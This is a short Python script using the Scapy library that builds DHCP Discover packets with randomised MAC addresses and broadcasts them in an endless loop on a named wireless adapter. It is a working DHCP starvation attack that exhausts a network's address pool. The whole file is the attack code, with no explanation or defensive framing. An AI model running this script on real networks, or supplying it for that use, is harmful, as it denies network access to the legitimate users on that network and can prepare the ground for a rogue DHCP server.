from scapy.all import * 

dhcp_discover_packet = Ether(src = RandMAC() , dst = "ff:ff:ff:ff:ff:ff", type = 0x0800) / IP(src = "0.0.0.0" , dst = "255.255.255.255")/UDP(sport = 68 , dport = 67) / BOOTP(op = 1,chaddr=RandMAC())/DHCP(options=[('message-type','discover'),('end')])


sendp(dhcp_discover_packet , iface = "Qualcomm Atheros AR956x Wireless Network Adapter" , loop = 1 , verbose = 1)